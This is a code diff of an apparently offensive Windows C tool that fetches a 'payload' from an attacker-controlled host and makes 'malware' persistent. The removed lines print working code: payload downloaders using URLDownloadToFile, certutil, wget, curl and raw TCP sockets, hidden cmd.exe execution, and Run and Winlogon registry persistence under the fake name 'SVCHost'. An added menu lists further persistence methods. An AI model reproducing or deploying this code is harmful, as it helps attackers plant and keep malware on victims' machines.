@@ -1,6 +1,4 @@
 #include <winsock2.h>
-#include <windows.h>
-#include <wininet.h>
 #include <stdlib.h>
 #include <ctype.h>
 #include <urlmon.h>
@@ -8,43 +6,19 @@
 #include <string.h>
 #include <unistd.h>
 #include <stdarg.h>
+#include "download.h"
+#include "pers.h"
 
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "ws2_32.lib")
 
-#define PERS_NAME "SVCHost"
-#define MAX_URL 2048
-#define MAX_FILE 255
-
-#define WIN_ERROR 0x0
-#define CONTINUE_ERROR 0x1 
-#define FAIL_ERROR 0x2
-#define SUCCESS 0x3
-
-typedef int (*ValidatorFunc)(char *arg, void *data);
-
-VOID TranslateErrorPrintImpl(DWORD errCode, const char *file, int line);
-VOID TranslateErrorPrintImplStr(const char *errMsg, const char *file, int line);
-
 VOID _ListOpts(const char *str, ...);
 #define ListOpts(...) _ListOpts(__VA_ARGS__, NULL)
 
-#define TranslateErrorPrint(errCode) TranslateErrorPrintImpl(errCode, __FILE__, __LINE__);
-#define TranslateErrorPrintStr(errMsg) TranslateErrorPrintImplStr(errMsg, __FILE__, __LINE__);
 typedef struct _WRITABLE_DIR {
     char path[MAX_PATH + 1];
 } WRITABLE_DIR, *PWRITABLE_DIR;
-
-typedef struct _DOWNLOAD_CONTEXT {
-    char *ip;
-    int ipLen;
-    int port;
-    char *sourceUrl;
-    int sourceUrlLen;
-    char *targetPath;
-    int targetPathLen;
-} DOWNLOAD_CONTEXT, *PDOWNLOAD_CONTEXT;
 
 static BOOL printHelp = TRUE;
 
@@ -65,59 +39,6 @@ VOID _ListOpts(const char *str, ...) {
     printf("\n\n");
 
     va_end(arg);
-}
-
-BOOL ExecuteCommand(const char* command) {
-    STARTUPINFOA si = {0};
-    PROCESS_INFORMATION pi = {0};
-    si.cb = sizeof(si);
-
-    int commandLen = strlen(command);
-    char execCmdCopy[commandLen + 16];
-    const char* cmd = "cmd.exe /C ";
-
-    int cmdLen = strlen(cmd);
-    memcpy(execCmdCopy, cmd, cmdLen);
-
-    memcpy(execCmdCopy + cmdLen, command, commandLen);
-    execCmdCopy[cmdLen + commandLen] = '\0';
-
-    printf("[!] Executing: %s\n", execCmdCopy);
-
-    BOOL rc = CreateProcessA(
-        NULL,
-        (LPSTR) execCmdCopy,
-        NULL, NULL, FALSE,
-        CREATE_NO_WINDOW,
-        NULL, NULL,
-        &si, &pi
-    );
-
-    if (rc == FALSE) {
-        TranslateErrorPrint(GetLastError());
-        return FALSE;
-    }
-    
-    WaitForSingleObject(pi.hProcess, INFINITE);
-
-    // Check exit exit code
-    DWORD exitCode = 0;
-    if (!GetExitCodeProcess(pi.hProcess, &exitCode)) {
-        TranslateErrorPrint(GetLastError());
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        return FALSE;
-    }
-
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-    
-    if (exitCode != 0) {
-        printf("[-] Command failed to execute (%lu). Try another option.\n", exitCode);
-        return FALSE;
-    }
-
-    return TRUE;
 }
 
 BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, ValidatorFunc validator, void *data) {
@@ -173,28 +94,6 @@ BOOL AddWritableDir(WRITABLE_DIR **array, int *count, int *capacity, const char 
     return TRUE;
 }
 
-VOID TranslateError(DWORD errCode, char **pErrMessage) {
-	FormatMessageA(
-	    FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-	    NULL,
-	    errCode,
-	    0,
-	    (LPSTR)pErrMessage,
-	    0,
-	    NULL);
-}
-
-VOID TranslateErrorPrintImplStr(const char* errMsg, const char *file, int line) {
-    fprintf(stderr, "[-] ERROR at %s:%d: %s", file, line, errMsg);
-}
-
-VOID TranslateErrorPrintImpl(DWORD errCode, const char *file, int line) {
-    char* errMsg;
-    TranslateError(errCode, &errMsg);
-    fprintf(stderr, "[-] ERROR at %s:%d: %lu - %s", file, line, errCode, errMsg);
-    LocalFree(errMsg);
-}
-
 BOOL FileExists(const char *path) {
 	DWORD attrib = GetFileAttributesA(path);
 	return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));
@@ -214,23 +113,6 @@ BOOL IsExecutable(const char *path) {
 	}
 
 	return TRUE;
-}
-
-BOOL LocateBinary(char *binaryPath, const char *binary, DWORD binaryPathSize) {
-    DWORD rc = SearchPathA(
-        NULL,
-        binary,
-        NULL,
-        binaryPathSize,
-        binaryPath,
-        NULL
-    );
-
-    if (!rc) {
-        printf("[-] Binary %s not found!\n", binary);
-    }
-    
-    return rc;
 }
 
 BOOL IsResourceValid(const char *source) {
@@ -274,126 +156,6 @@ BOOL IsResourceValid(const char *source) {
         printf("[?] To start a webserver for hosting your payload, run the following command inside the directory of your binary\n\t$ python3 -m http.server\n");
         return FALSE;
     }
-}
-
-BOOL DownloadUsingWin32(const PDOWNLOAD_CONTEXT pDc) {
-    printf("[*] Downloading the payload using Win32 API\n");
-    printf("[*] Target path: %s\n", pDc->targetPath);
-    HRESULT hResult = URLDownloadToFile(
-        NULL,
-        pDc->sourceUrl,
-        pDc->targetPath,
-        0, NULL
-    );
-
-    if (hResult != S_OK) {
-        switch(hResult) {
-            case INET_E_RESOURCE_NOT_FOUND:
-                fprintf(stderr, "[-] No internet connection.\n");
-                break;
-            case INET_E_INVALID_URL:
-                fprintf(stderr, "[-] Invalid URL.\n");
-                break;
-            case INET_E_DOWNLOAD_FAILURE:
-                fprintf(stderr, "[-] Cannot write to destination path.\n");
-                break;
-            default:
-                fprintf(stderr, "[-] Unknown error. HRESULT: 0x%08lX\n", hResult);
-                break;
-        }
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-BOOL DownloadUsingCertutil(const PDOWNLOAD_CONTEXT pDc) {
-    char certutilPath[MAX_PATH + 1];
-    int certutilPathLen = LocateBinary(certutilPath, "certutil.exe", MAX_PATH);
-    if (!certutilPathLen) {
-        return FALSE;
-    }
-
-    printf("[*] Downloading the payload using certutil.exe\n");
-    char command[pDc->sourceUrlLen + pDc->targetPathLen + MAX_PATH + 64];
-    snprintf(command, sizeof(command), "%s -urlcache -split -f %s %s", certutilPath, pDc->sourceUrl, pDc->targetPath);
-    return ExecuteCommand(command);
-}
-
-BOOL DownloadUsingWget(const PDOWNLOAD_CONTEXT pDc) {
-    char wgetPath[MAX_PATH + 1];
-    int wgetPathLen = LocateBinary(wgetPath, "wget.exe", MAX_PATH);
-    if (!wgetPathLen) {
-        return FALSE;
-    }
-
-    char command[pDc->sourceUrlLen + pDc->targetPathLen + MAX_PATH + 64];
-    snprintf(command, sizeof(command), "%s -O %s %s", wgetPath, pDc->targetPath, pDc->sourceUrl);
-    return ExecuteCommand(command);
-    printf("[*] Downloading the payload using wget\n");
-}
-
-BOOL DownloadUsingCurl(const PDOWNLOAD_CONTEXT pDc) {
-    char curlPath[MAX_PATH + 1];
-    int curlPathLen = LocateBinary(curlPath, "curl.exe", MAX_PATH);
-    if (!curlPathLen) {
-        return FALSE;
-    }
-
-    char command[pDc->sourceUrlLen + pDc->targetPathLen + MAX_PATH + 64];
-    snprintf(command, sizeof(command), "%s -o %s %s", curlPath, pDc->targetPath, pDc->sourceUrl);
-    return ExecuteCommand(command);
-    printf("[*] Downloading the payload using curl\n");
-}
-
-BOOL DownloadUsingTCPSocket(const PDOWNLOAD_CONTEXT pDc) {
-    printf("[*] Downloading the payload using raw TCP sockets\n");
-    
-    WSADATA wsa;
-    struct sockaddr_in serverAddr;
-    char buffer[4096];
-    int bufferSize = sizeof(buffer);
-    int received;
-    long long totalReceived = 0;
-    FILE* f;
-    char errMsg[1024];
-
-    WSAStartup(MAKEWORD(2, 2), &wsa);
-
-    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
-    if (clientSocket == INVALID_SOCKET) {
-        return FALSE;
-    }
-
-    serverAddr.sin_addr.s_addr = inet_addr(pDc->ip);
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(pDc->port);
-     
-    if (connect(clientSocket, (struct sockaddr*) &serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        TranslateErrorPrint(WSAGetLastError());
-        snprintf(errMsg, sizeof(errMsg), "Connection failed to %s:%d.\n[!] Make sure to host your file with the following command\n\t$ nc -nlvp <PORT> -q 1< <PAYLOAD>\n", pDc->ip, pDc->port);
-        TranslateErrorPrintStr(errMsg);
-        return FALSE;
-    }
-
-    f = fopen(pDc->targetPath, "wb");
-    if (!f) {
-        closesocket(clientSocket);
-        snprintf(errMsg, sizeof(errMsg), "Failed to open %s\n", pDc->targetPath);
-        TranslateErrorPrintStr(errMsg);
-        return FALSE;
-    }
-
-    while ((received = recv(clientSocket, buffer, bufferSize, 0)) > 0) {
-        fwrite(buffer, 1, received, f);
-        totalReceived += received;
-    }
-    
-    printf("[+] Successfully received %lu bytes of data\n", totalReceived);
-    fclose(f);
-    closesocket(clientSocket);
-    WSACleanup();
-    return TRUE;
 }
 
 int HandleDownload(char* opt, void *data) {
@@ -442,6 +204,21 @@ int HandleDownload(char* opt, void *data) {
     }
 }
 
+int HandlePersistence(char *opt, void *data) {
+    char *targetPath = (char*) data;
+
+    if (printHelp) {
+        ListOpts(
+            "Registry run key",
+            "Registry winlogon key",
+            "Create a startup service",
+            "Create a scheduled task",
+            "Hijack screensaver",
+            "Startup folder"
+        );
+    }
+}
+
 int HasWriteAccess(char *dirPath, void *data) {
     (void) data;
 
@@ -472,69 +249,7 @@ int HasWriteAccess(char *dirPath, void *data) {
     CloseHandle(hFile);
     return SUCCESS;
 }
-
-BOOL InjectRunRegistry(const char *malwareFull, int malwareFullLen) {
-	HKEY hKey = NULL;
-	const char *REG = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-	DWORD errCode;
-	char *errMsg = NULL;
-
-	// Get our handle to the registry
-	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
-	if (result != ERROR_SUCCESS) {
-		errCode = GetLastError();
-		TranslateError(errCode, &errMsg);
-		printf("[-] An error occured while opening the Run registry key: %s\n", errMsg);
-		LocalFree(errMsg);
-		return FALSE;
-	}
-
-	// Add to the registry key, the path to our malware
-	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
-	if (result != ERROR_SUCCESS) {
-		errCode = GetLastError();
-		TranslateError(errCode, &errMsg);
-		printf("[-] An error occured while setting registry key: %s\n", errMsg);
-		LocalFree(errMsg);
-		RegCloseKey(hKey);
-		return FALSE;
-	}
-
-	printf("Run registry key set for: %s\n", malwareFull);
-	return TRUE;
-}
-
-BOOL InjectWinlogonRegistry(const char *malwareFull, int malwareFullLen) {
-	HKEY hKey = NULL;
-	const char *REG = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
-	DWORD errCode;
-	char *errMsg = NULL;
-
-	// Get our handle to the registry
-	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
-	if (result != ERROR_SUCCESS) {
-		errCode = GetLastError();
-		TranslateError(errCode, &errMsg);
-		printf("[-] An error occured while opening the Winlogon registry key: %s\n", errMsg);
-		LocalFree(errMsg);
-		return FALSE;
-	}
-
-	// Add to the registry key, the path to our malware
-	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
-	if (result != ERROR_SUCCESS) {
-		errCode = GetLastError();
-		TranslateError(errCode, &errMsg);
-		printf("[-] An error occured while setting registry key: %s\n", errMsg);
-		LocalFree(errMsg);
-		RegCloseKey(hKey);
-		return FALSE;
-	}
-
-	printf("Winlogon registry key set for: %s\n", malwareFull);
-	return TRUE;
-}
-
+ 
 BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *exeLen, char *target, int *targetLen, int *port, BOOL *socketReceive) {
 	int opt;
 	int iFlag = 0, eFlag = 0, tFlag = 0;
@@ -612,7 +327,9 @@ int main(int argc, char* argv[]) {
 
     WRITABLE_DIR *wdirs = NULL;
     int capacity = 16, count = 0;
-    
+   
+printf("     .    .     .            +         .         .                 .  .\n      .                 .                   .               .\n              .    ,,o         .                  __.o+.\n    .            od8^                  .      oo888888P^b           .\n       .       ,\".o'      .     .             `b^'\"\"`b -`b   .\n             ,'.'o'             .   .          t. = -`b -`t.    .\n            ; d o' .        ___          _.--.. 8  -  `b  =`b\n        .  dooo8<       .o:':__;o.     ,;;o88%%8bb - = `b  =`b.    .\n    .     |^88^88=. .,x88/::/ | \\\\`;;;;;;d%%%%%88%88888/%x88888\n          :-88=88%%L8`%`|::|_>-<_||%;;%;8%%=;:::=%8;;\\%%%%\\8888\n      .   |=88 88%%|HHHH|::| >-< |||;%;;8%%=;:::=%8;;;%%%%+|]88        .\n          | 88-88%%LL.%.%b::Y_|_Y/%|;;;;`%8%%oo88%:o%.;;;;+|]88  .\n          Yx88o88^^'\"`^^%8boooood..-\\H_Hd%P%%88%P^%%^'\\;;;/%%88\n         . `\"\\^\\          ~\"\"\"\"\"'      d%P \"\"\"^\" ;   = `+' - P\n   .        `.`.b   .                :<%%>  .   :  -   d' - P      . .\n              .`.b     .        .    `788      ,'-  = d' =.'\n       .       ``.b.                           :..-  :'  P\n            .   `q.>b         .               `^^^:::::,'       .\n    LS            \"\"^^               .                     .\n  .                                           .               .       .\n    .         .          .                 .        +         .\n                    Sienar Fleet Systems' TIE Bomber\n                         Light Space Bomber (2)\n                         Code by viv4ldi\n                         Art by ascii.co.uk\n\n\n");
+
 	if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port, &receiveUsingSocket) == FALSE) {
         printf("[!] Usage: %s -i <IP> -e <EXE> [-t <TARGET NAME>] [-p <PORT>] [-s (use raw TCP sockets)]\n", argv[0]);
 		exit(1);
@@ -665,7 +382,7 @@ int main(int argc, char* argv[]) {
     };
 
     if (!receiveUsingSocket) {
-        printf("\n\n[*] **DOWNLOAD OPTION**\n\n");
+        printf("\n\n[*] **DOWNLOAD OPTIONS**\n\n");
         downloadContext.sourceUrl = source;
         downloadContext.sourceUrlLen = strlen(source);
         HandleDownload(NULL, NULL);
@@ -678,37 +395,7 @@ int main(int argc, char* argv[]) {
         }
     }
 
-    printf("\n\n[*] **PERSISTENCE OPTIONS**\n\n"); 
-/*
-	if (!FileExists(malware)) {
-	    printf("[-] The malware does not exists\n");
-	    return 1;
-	}
-
-	GetFullPathName(malware, MAX_PATH, malwareFull, NULL);
-	malwareFullLen = strlen(malwareFull);
-	malwareFull[malwareFullLen] = '\0';
-
-	if (!IsExecutable(malwareFull)) {
-	    return 1;
-	}
-	printf("[+] Valid malicious executable: %s\n[+] Starting to apply persistence techniques\n", malwareFull);
-	*/
-	// Try registry run key
-	/*
-	if (!InjectRunRegistry(malwareFull, malwareFullLen)) {
-	    printf("[-] Persistence via Run Registry failed. Trying the next one\n");
-	} else {
-	    printf("[+] Persistence via Run Registry successful\n"); return 0; } */
-	// Abusing Registry key used by Winlogon process
-	/*
-	if (!InjectWinlogonRegistry(malwareFull, malwareFullLen)) {
-	    printf("[-] Persistence via Winlogon Registry failed. Trying the next one\n");
-	} else {
-	    printf("[+] Persistence via Winlogon Registry successful\n");
-	    return 0;
-	}
-	*/
+    printf("\n\n[*] **PERSISTENCE OPTIONS**\n\n");    
     
 	return 0;
 }
